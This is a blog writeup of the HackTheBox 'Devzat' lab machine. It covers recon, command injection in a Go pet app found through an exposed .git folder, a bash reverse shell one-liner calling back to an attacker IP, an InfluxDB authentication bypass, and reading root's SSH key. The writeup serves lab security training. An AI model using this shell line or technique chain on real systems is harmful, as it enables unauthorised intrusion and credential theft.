---
title: "HackTheBox - Devzat"
date: 2022-07-29T12:06:16-04:00
summary: "Writeup for the Devzat lab machine on HackTheBox"
draft: false
tags: [HackTheBox]
categories: [Hacking]
cover:
    image: "https://www.hackthebox.com/storage/avatars/43a4b7b2ba6e11c48b128aa46cddaf49.png" # image path/url
    alt: "Devzat" # alt text
    caption: "" # display caption under cover
    relative: false # when using page bundles set this to true
---

# Introduction

Devzat is a box on HackTheBox that involves heavily exploiting a user created chat app. The chat app
does not seem to be usable for initial exploitation. However, after initial access, the app becomes
a great source of system enumeration from the chat logs, as well as being able to be used to privesc
to root. The initial access is gained from a subdomain hosting an incomplete CRUD app for managing
an inventory of pets that has the .git directory publicly available. With access to the git folder,
we can get the source for the web app and discover a command injection vulnerability that can be
exploited with Burpsuite. Initial access as Patrick allows us to read his chat logs, revealing an
Influxdb instance is running that is vulnerable to an authentication bypass. The database contains
credentials for another user, Catherine, who we are then able to login as. Catherine's chat log
reveals there is a development version of the chat app running on port 8443, and there is a backup
file on the system. Analysis of the backed up files shows we can use app on port 8443 to read files
as root. We can then read roots ssh key to login as root.

## Enumeration

### Nmap

From the nmap results, we can see that this is a webserver with an unidentified app on port 8000.
Based on the scan on port 8000, it seems to be using a go library called [ssh2go](https://github.com/karfield/ssh2go)

```nohighlight
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.022s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: devzat - where the devs at
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=7/5%Time=62C472E7%P=x86_64-pc-linux-gnu%r(NUL
SF:L,C,"SSH-2\.0-Go\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/5%OT=22%CT=1%CU=34441%PV=Y%DS=2%DC=T%G=Y%TM=62C47312
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   21.19 ms 10.10.14.1
2   21.28 ms devzat.htb (10.10.11.118)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### Website - http://devzat.htb

Initial scanning shows the box has a website up. Trying to navigate to the website redirects us to
[http://devzat.htb](http://devzat.htb). After updating our /etc/hosts, we are able to see the webpage.

```nohighlight
trent@TMDeal-kali[Devzat]$ cat /etc/hosts
...
10.10.14.1    devzat.htb
...
```
![http://devzat.htb Homepage](/images/htb/devzat/website/homepage.png)

Not much about the site itself is interesting. However, there is a message at the bottom informing
the reader that they are invited to try out their chat app.

![Chat App Usage](/images/htb/devzat/website/chat_app_start_instructions.png)

When running the instructed command, you may receive an error about no matching host key type. This
error can be resolved by adding a few lines to ~/.ssh/config

```nohighlight
Host devzat.htb
	HostName devzat.htb
	User dev
	PubkeyAcceptedAlgorithms +ssh-rsa
	HostkeyAlgorithms +ssh-rsa
```

![Initial Connection](/images/htb/devzat/chat_app/initial_connection.png)

### Chat App First Look

With just the basic level of access we have, there is not much that can be done with the app right
now. We will come back to this at a later point

### Subdomin - http://pets.devzat.htb

Taking a look back at port 80, since we needed to add an entry to /etc/hosts, it may be worthwhile
to scan for subdomains. We will scan for subdomains using Gobuster.

![Pets Subdomain Discovery](/images/htb/devzat/website/pets/gobuster_subdomain_discovery.png)

Our scan finds one valid subdomain at http://pets.devzat.htb The homepage is an incomplete CRUD
app.

![http://pets.devzat.htb Homepage](/images/htb/devzat/website/pets/homepage.png)

The most that can be done is adding a pet to the pet inventory, but its not hooked up to a database
so nothing saves. Running Gobuster to find other endpoints shows that http://pets.devzat.htb/.git/
is publicly readable. We can grab the contents of the folder with
[git-dumper](https://pypi.org/project/git-dumper/)

```nohighlight
trent@TMDeal-kali[Devzat]$ git-dumper http://pets.devzat.htb/.git pets
...
...
...
trent@TMDeal-kali[Devzat]$ ls -al pets/
total 9776
drwxr-xr-x  5 trent trent    4096 Jul 26 17:44 .
drwxrwxrwt 28 root  root    12288 Jul 26 17:44 ..
drwxr-xr-x  2 trent trent    4096 Jul 26 17:44 characteristics
drwxr-xr-x  7 trent trent    4096 Jul 26 17:44 .git
-rw-r--r--  1 trent trent      25 Jul 26 17:44 .gitignore
-rw-r--r--  1 trent trent      88 Jul 26 17:44 go.mod
-rw-r--r--  1 trent trent     163 Jul 26 17:44 go.sum
-rw-r--r--  1 trent trent    4420 Jul 26 17:44 main.go
-rwxr-xr-x  1 trent trent 9957033 Jul 26 17:44 petshop
-rwxr-xr-x  1 trent trent     123 Jul 26 17:44 start.sh
drwxr-xr-x  4 trent trent    4096 Jul 26 17:44 static
```

This is probably the source code for the pets web application. Inside of main.go, there is code that
takes our input without sanitizing it and passes it to `exec.Command`. This means we can inject our
own commands into this command and gain remote code execution

![Call to exec.Command](/images/htb/devzat/git/main_execs_sh.png)

## Shell as Patrick

To test if we can properly execute code, we will just see if we can get the contents of /etc/passwd

![Burp Payload](/images/htb/devzat/git/burp_payload.png)
![Contents of /etc/passwd](/images/htb/devzat/git/dumping_etc_passwd.png)

Now that we now we can actually exploit this, we can execute a callback to a netcat listener.

We base64 encrypt the command `bash -i >& /dev/tcp/10.10.14.7/4444 0>&1` and then decrypt and
execute it in a one liner. This is done to avoid messing up the payload with special characters like
`"` or `'`.

![Sending the request with Burp](/images/htb/devzat/git/rce_request.png)
![Shell as Patrick](/images/htb/devzat/shell_as_patrick.png)

From there, we can grab Patrick's ssh key for a better shell experience

![Shell as Patrick](/images/htb/devzat/shell_as_patrick_ssh.png)

## Shell as Catherine

### Interesting Ports

After running linpeas, we can see that there are some ports that are open locally that we could not
previously access

![Open local ports](/images/htb/devzat/linpeas/active_ports.png)

Right now, we do not know what these ports do, so we will look around some more.

### Patrick Chat Log

We can see Patrick's chat log in the chat app by logging into it while logged into the machine as
Patrick

![Patrick chat log](/images/htb/devzat/patrick_chat_log.png)

Looking up info on Influxdb shows that it runs on port 8086 by default, and is thus likely what we
saw earlier in linpeas. We can check the version of Influxdb running by making a HEAD request with
curl on port 8086

![Influxdb version](/images/htb/devzat/influxdb/influxdb_version.png)

Looking up "Influxdb 1.7.5" on google shows results for
[CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

With this exploit, we can bypass authentication and gain access to the database as an admin. We need
to port forward with ssh in order to access the database on our machine.

`ssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i patrick_id_rsa`.

![Login as admin on Influxdb](/images/htb/devzat/influxdb/admin_access.png)

From there, we can dump the data from the users table

![Database dump](/images/htb/devzat/influxdb/user_passwords.png)

This reveals a few users and their passwords, but Catherine sticks out because that is a user on the
box. Attempting to use this password to switch users to Catherine is successful

![Shell as Catherine](/images/htb/devzat/shell_as_catherine.png)
![User flag](/images/htb/devzat/user_get.png)

## Shell as Root

Now that we are Catherine, lets examine her chat log like we did for Patrick.

![Catherine chat log](/images/htb/devzat/catherine_chat_log.png)

The chat log mentions the development version of the chat app is up on port 8443, and the source
code is in a backup file. Checking in /var/backup we find archives of the development and main
version.

![Backup files](/images/htb/devzat/chat_app/backup_files.png)

Extracting and checking the this version of the code shows a new command `file` has been added that
allows reading files on the system. A password is required, but it is hardcoded into the app, so we
can just read it. Since this program is running as root, we can read roots ssh key

![Password to run command](/images/htb/devzat/dev_chat_app/pass_for_reading_files.png)
![Reading root ssh key](/images/htb/devzat/dev_chat_app/root_ssh_key.png)

Then we can just ssh as root

![Shell as root](/images/htb/devzat/shell_as_root.png)
![Root flag](/images/htb/devzat/root_get.png)
